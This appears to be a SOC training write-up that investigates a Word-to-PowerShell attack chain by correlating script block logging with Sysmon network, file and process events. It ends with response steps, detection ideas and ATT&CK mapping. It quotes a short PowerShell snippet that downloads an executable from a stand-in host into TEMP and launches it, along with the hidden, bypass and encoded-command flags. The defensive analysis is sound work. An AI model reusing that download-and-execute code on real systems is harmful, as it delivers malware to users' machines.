# Case 05 — PowerShell Investigation

## Case Overview

**Case ID:** CASE-05
**Investigation Type:** PowerShell-based endpoint investigation
**Severity:** High
**Classification:** Malicious
**Confidence:** High
**Primary Telemetry:** PowerShell Event ID 4104, Sysmon Event IDs 1, 3, and 11
**Environment:** Windows endpoint
**Investigation Focus:** Suspicious PowerShell execution, script block analysis, network activity, file creation, and process execution

---

## Executive Summary

This investigation analyzes a suspicious PowerShell execution chain designed to demonstrate a realistic endpoint attack scenario.

The investigation began with suspicious PowerShell execution involving:

```text
-WindowStyle Hidden
-ExecutionPolicy Bypass
-EncodedCommand
```

PowerShell Event ID 4104 provided visibility into the PowerShell script block being processed.

The script contained functionality to download an executable from a remote destination and save it as:

```text
invoice.exe
```

The PowerShell activity was then correlated with Sysmon telemetry.

The resulting evidence chain showed:

```text
WINWORD.EXE
     |
     v
powershell.exe
     |
     +--> Hidden execution
     +--> Execution Policy Bypass
     +--> Encoded Command
     |
     v
PowerShell Event ID 4104
     |
     v
Remote executable download
     |
     v
Sysmon Event ID 3
     |
     v
invoice.exe created
     |
     v
Sysmon Event ID 11
     |
     v
invoice.exe executed
     |
     v
Sysmon Event ID 1
```

Based on the combined evidence, the activity was classified as:

**Malicious — High Confidence**

---

# Investigation Objectives

The objectives of this investigation were to determine:

* What process initiated the suspicious activity.
* How PowerShell was executed.
* Whether PowerShell contained suspicious or malicious commands.
* Whether PowerShell established network connections.
* Whether a file was created as a result of the activity.
* Whether the created file was executed.
* How the events could be correlated into a single attack timeline.
* Whether the activity should be classified as benign, suspicious, or malicious.

---

# Initial Detection

The initial activity attracting attention was the PowerShell process.

Several command-line characteristics increased the suspicion level:

```text
-WindowStyle Hidden
-ExecutionPolicy Bypass
-EncodedCommand
```

These indicators are not independently sufficient to prove malicious activity.

However, their combination is highly relevant to a SOC investigation because attackers can use these techniques to:

* Reduce visibility.
* Bypass normal PowerShell execution restrictions.
* Obfuscate commands.
* Execute code without presenting an obvious interactive window.

The parent-child relationship was also significant because PowerShell was launched by:

```text
WINWORD.EXE
```

A Microsoft Word process spawning PowerShell can be suspicious because Office applications are commonly abused as an initial execution mechanism.

---

# Evidence Collected

## 1. PowerShell Event ID 4104

PowerShell Script Block Logging captured the PowerShell code being processed.

The relevant script contained:

```powershell
$u = "https://cdn-update-check.example/update.exe"
$p = "$env:TEMP\invoice.exe"

(New-Object Net.WebClient).DownloadFile($u,$p)

Start-Process $p
```

### Interpretation

The script contains two important actions:

1. Download a remote executable.
2. Start the downloaded executable.

This provides strong evidence of the intended execution chain.

However, Event ID 4104 by itself should not be treated as proof that every action in the script successfully occurred.

Additional telemetry was therefore required.

---

# 2. Sysmon Event ID 3 — Network Connection

Sysmon Event ID 3 showed a network connection associated with the PowerShell activity.

### Destination

```text
cdn-update-check.example
```

### Destination Port

```text
443
```

### Interpretation

The network event provided supporting evidence that the PowerShell activity communicated with the remote destination.

This strengthened the correlation between the PowerShell script observed in Event ID 4104 and the actual network activity.

The investigation therefore did not rely solely on the script's stated intent.

---

# 3. Sysmon Event ID 11 — File Creation

Sysmon Event ID 11 showed that PowerShell created:

```text
C:\Users\Analyst\AppData\Local\Temp\invoice.exe
```

### Interpretation

This was significant because the PowerShell script contained:

```powershell
$p = "$env:TEMP\invoice.exe"
```

The file-creation event therefore correlated with the behavior described in the PowerShell script.

This provided evidence that the executable was actually written to disk.

---

# 4. Sysmon Event ID 1 — Process Creation

A subsequent Sysmon Event ID 1 showed that:

```text
invoice.exe
```

was executed.

PowerShell was identified as the parent process.

### Interpretation

This completed an important part of the attack chain:

```text
PowerShell
    |
    v
Download
    |
    v
invoice.exe created
    |
    v
invoice.exe executed
```

The presence of process creation telemetry was important because the PowerShell script's `Start-Process` command alone would not be sufficient to prove that the executable was successfully launched.

---

# Attack Timeline

The investigation can be reconstructed into the following sequence:

### Step 1 — Office Application

```text
WINWORD.EXE
```

initiated the suspicious activity.

### Step 2 — PowerShell Execution

```text
powershell.exe
```

was launched with suspicious arguments including:

```text
-WindowStyle Hidden
-ExecutionPolicy Bypass
-EncodedCommand
```

### Step 3 — Script Block Logging

PowerShell Event ID 4104 captured the PowerShell script block.

The script contained functionality to download an executable and launch it.

### Step 4 — Network Activity

Sysmon Event ID 3 recorded a connection to:

```text
cdn-update-check.example
```

over:

```text
TCP/443
```

### Step 5 — File Creation

Sysmon Event ID 11 recorded creation of:

```text
C:\Users\Analyst\AppData\Local\Temp\invoice.exe
```

### Step 6 — Process Execution

Sysmon Event ID 1 recorded execution of:

```text
invoice.exe
```

with PowerShell as the parent process.

---

# Evidence Correlation

The strength of this investigation comes from correlating multiple independent telemetry sources.

| Evidence                       | What It Shows                   | Investigation Value                       |
| ------------------------------ | ------------------------------- | ----------------------------------------- |
| `WINWORD.EXE → powershell.exe` | Parent-child relationship       | Suspicious Office-to-PowerShell execution |
| PowerShell command line        | Hidden/bypass/encoded execution | Increased suspicion                       |
| PowerShell 4104                | Script block/code               | Reveals intended PowerShell behavior      |
| Sysmon 3                       | Network connection              | Supports actual communication             |
| Sysmon 11                      | `invoice.exe` creation          | Supports successful file creation         |
| Sysmon 1                       | `invoice.exe` execution         | Supports actual process execution         |

No single event provides the complete story.

The events become significantly more meaningful when correlated.

---

# Important Evidence Interpretation

A key lesson from this investigation is understanding the difference between **intent** and **observed behavior**.

For example, Event ID 4104 contained:

```powershell
(New-Object Net.WebClient).DownloadFile($u,$p)
```

This demonstrates that the PowerShell script contained download functionality.

It does not, by itself, prove that the download succeeded.

The investigation therefore looked for additional evidence.

Sysmon Event ID 3 provided network telemetry.

Sysmon Event ID 11 provided file-creation telemetry.

Sysmon Event ID 1 provided process-execution telemetry.

This produced a much stronger evidence chain:

```text
Script contains download code
            +
Network connection observed
            +
Executable created
            +
Executable executed
            =
Strong correlated evidence
```

This is the type of evidence-based reasoning expected during SOC investigations.

---

# Why the Activity Was Malicious

The classification was based on the combined behavior rather than a single indicator.

### Suspicious characteristics

* Microsoft Word spawned PowerShell.
* PowerShell was executed with `-WindowStyle Hidden`.
* PowerShell used `-ExecutionPolicy Bypass`.
* PowerShell used `-EncodedCommand`.
* PowerShell contained code to download an executable.
* A remote network connection was observed.
* An executable was created in the user's temporary directory.
* The executable was subsequently executed.

The complete chain demonstrated behavior consistent with malicious execution and payload delivery.

Therefore:

```text
Classification: MALICIOUS
Confidence: HIGH
```

---

# Why Individual Indicators Were Not Enough

A SOC analyst should avoid making decisions based on a single suspicious characteristic.

For example:

```text
-ExecutionPolicy Bypass
```

is suspicious but can also appear in legitimate administrative activity.

Similarly:

```text
powershell.exe
```

is a legitimate Windows executable.

Even:

```text
-EncodedCommand
```

requires context.

The confidence increased because multiple suspicious behaviors were connected into a single execution chain.

---

# Investigation Methodology

The investigation followed a structured SOC workflow:

```text
1. Identify suspicious process
          |
          v
2. Examine command line
          |
          v
3. Examine parent process
          |
          v
4. Inspect PowerShell Event ID 4104
          |
          v
5. Identify intended actions
          |
          v
6. Correlate network activity
          |
          v
7. Correlate file creation
          |
          v
8. Correlate process execution
          |
          v
9. Build timeline
          |
          v
10. Determine classification
          |
          v
11. Recommend response actions
```

This approach helps prevent premature conclusions.

---

# Immediate SOC Response

If this activity were detected on a production endpoint, the recommended immediate response would be:

### 1. Isolate the Endpoint

Prevent further communication with potentially malicious infrastructure and reduce the possibility of lateral movement.

### 2. Preserve Evidence

Preserve relevant:

* Windows Event Logs.
* PowerShell logs.
* Sysmon logs.
* Process information.
* Network information.
* Suspicious files.
* Relevant memory or forensic artifacts where appropriate.

### 3. Investigate `invoice.exe`

Collect and investigate:

* File hash.
* File metadata.
* Digital signature.
* Compilation information.
* Parent/child process relationships.
* Execution history.
* Reputation and threat intelligence.

### 4. Investigate the Network Destination

Investigate:

```text
cdn-update-check.example
```

for:

* Domain reputation.
* Related infrastructure.
* Historical activity.
* Other affected endpoints.
* Additional indicators.

### 5. Search for Related Indicators

Search the environment for:

```text
invoice.exe
```

and other relevant indicators including:

* File hashes.
* Domain names.
* IP addresses.
* PowerShell command patterns.
* Suspicious Office-to-PowerShell relationships.

### 6. Investigate Persistence

Determine whether the activity established persistence through mechanisms such as:

* Scheduled tasks.
* Registry run keys.
* Services.
* Startup folders.
* WMI-based mechanisms.
* Other persistence techniques.

### 7. Investigate Initial Access

Because the attack chain begins with:

```text
WINWORD.EXE
```

the original Office document and associated email or download source should be investigated.

Potential questions include:

* Where did the document originate?
* Was it received through email?
* Was it downloaded from the Internet?
* Did other users receive the same document?
* Were macros or other embedded content involved?

---

# Additional Investigation Opportunities

A deeper investigation could include:

## Process Investigation

Examine:

```text
WINWORD.EXE
      |
      v
powershell.exe
      |
      v
invoice.exe
```

Determine whether there were additional processes before or after this chain.

## DNS Investigation

Search for related DNS queries using Sysmon Event ID 22.

## Network Investigation

Search for:

```text
cdn-update-check.example
```

across endpoint and network telemetry.

## File Investigation

Calculate the SHA-256 hash of:

```text
invoice.exe
```

and use the hash as an investigation indicator.

## Endpoint-Wide Search

Search other systems for:

* The same executable name.
* The same hash.
* The same domain.
* Similar PowerShell commands.
* Similar Office-to-PowerShell process relationships.

---

# Detection Opportunities

This investigation also provides potential detection ideas for a SOC environment.

Possible detection signals include:

```text
Office application
        +
PowerShell child process
```

combined with:

```text
-ExecutionPolicy Bypass
```

or:

```text
-WindowStyle Hidden
```

or:

```text
-EncodedCommand
```

Additional correlation opportunities include:

```text
PowerShell
   +
Network connection
   +
Executable creation
```

and:

```text
PowerShell
   +
Executable creation
   +
New process execution
```

Detection logic should be tuned carefully to reduce false positives.

---

# Key SOC Lessons

## 1. Start With the Process Tree

The relationship:

```text
WINWORD.EXE → powershell.exe
```

provided important context immediately.

Parent-child relationships are often one of the fastest ways to understand suspicious process execution.

---

## 2. Command-Line Arguments Matter

PowerShell's command line contained several indicators that justified deeper investigation.

The analyst should always inspect the full command line rather than only identifying the executable.

---

## 3. 4104 Reveals PowerShell Code

PowerShell Event ID 4104 provided visibility into the script block being processed.

This allowed the analyst to understand the intended behavior of the PowerShell activity.

---

## 4. Correlate Intent With Observed Behavior

The script indicated an intended download.

Sysmon then provided supporting evidence of:

```text
Network connection
       +
File creation
       +
Process execution
```

This distinction between intended behavior and observed behavior is critical.

---

## 5. Do Not Overclaim Evidence

Event ID 4104 alone did not prove the file was downloaded.

The investigation required Sysmon telemetry to establish the additional parts of the chain.

Similarly, if an expected telemetry event is absent, the analyst should record that absence rather than inventing an event.

---

## 6. Build a Timeline

The final classification became much clearer after reconstructing the complete sequence.

A timeline is often more useful than looking at individual events independently.

---

# Final Assessment

The investigation identified a coordinated PowerShell execution chain involving:

```text
WINWORD.EXE
      ↓
powershell.exe
      ↓
Hidden / Bypass / Encoded execution
      ↓
PowerShell Event ID 4104
      ↓
Remote connection
      ↓
invoice.exe created
      ↓
invoice.exe executed
```

The combination of suspicious execution parameters, PowerShell script content, network activity, file creation, and subsequent process execution provides strong evidence of malicious activity.

### Final Classification

```text
🔴 MALICIOUS
```

### Confidence

```text
HIGH
```

---

# Indicators Observed

| Indicator                                         | Type                   | Purpose                         |
| ------------------------------------------------- | ---------------------- | ------------------------------- |
| `WINWORD.EXE`                                     | Process                | Initial parent process          |
| `powershell.exe`                                  | Process                | Script execution                |
| `-WindowStyle Hidden`                             | Command-line indicator | Hidden PowerShell execution     |
| `-ExecutionPolicy Bypass`                         | Command-line indicator | Execution policy bypass         |
| `-EncodedCommand`                                 | Command-line indicator | Command obfuscation             |
| `cdn-update-check.example`                        | Domain                 | Remote destination              |
| `invoice.exe`                                     | File                   | Downloaded executable           |
| `C:\Users\Analyst\AppData\Local\Temp\invoice.exe` | File path              | Created payload                 |
| SHA-256                                           | File hash              | Recommended follow-up indicator |

> **Note:** A file hash was identified as a recommended next investigative step rather than claimed as observed telemetry in this case.

---

# MITRE ATT&CK Mapping

The observed behavior can be considered in the context of several MITRE ATT&CK techniques.

| Technique                                           | Relevance                                                                   |
| --------------------------------------------------- | --------------------------------------------------------------------------- |
| T1059.001 — PowerShell                              | PowerShell used for command/script execution                                |
| T1204 — User Execution                              | Potential relevance because the chain originated from an Office application |
| T1105 — Ingress Tool Transfer                       | PowerShell downloaded an executable                                         |
| T1027 — Obfuscated/Compressed Files and Information | Encoded PowerShell command                                                  |
| T1218 / Office-related execution context            | Requires additional evidence before assigning a specific technique          |

MITRE ATT&CK mapping should be treated as an analytical aid and should only be assigned when the observed behavior supports the technique.

---

# Investigation Conclusion

This case demonstrates why effective SOC investigation requires **correlation across multiple telemetry sources**.

PowerShell Event ID 4104 revealed the script logic, while Sysmon provided supporting evidence for process creation, network communication, and file creation.

The final conclusion was not based on PowerShell alone.

Instead, the classification was supported by the complete correlated execution chain:

```text
Process
  ↓
Command Line
  ↓
PowerShell Script
  ↓
Network Activity
  ↓
File Creation
  ↓
Process Execution
```

This evidence-driven approach resulted in a **high-confidence malicious classification**.

---

## Lessons Applied From Day 7

* Investigate PowerShell rather than automatically classifying it as malicious.
* Examine parent-child process relationships.
* Analyze full command-line arguments.
* Use Event ID 4104 to understand PowerShell script blocks.
* Correlate PowerShell telemetry with Sysmon.
* Distinguish intended behavior from confirmed behavior.
* Do not invent missing telemetry.
* Build a chronological attack timeline.
* Base classification on correlated evidence.
* Recommend containment and further investigation based on the complete attack chain.
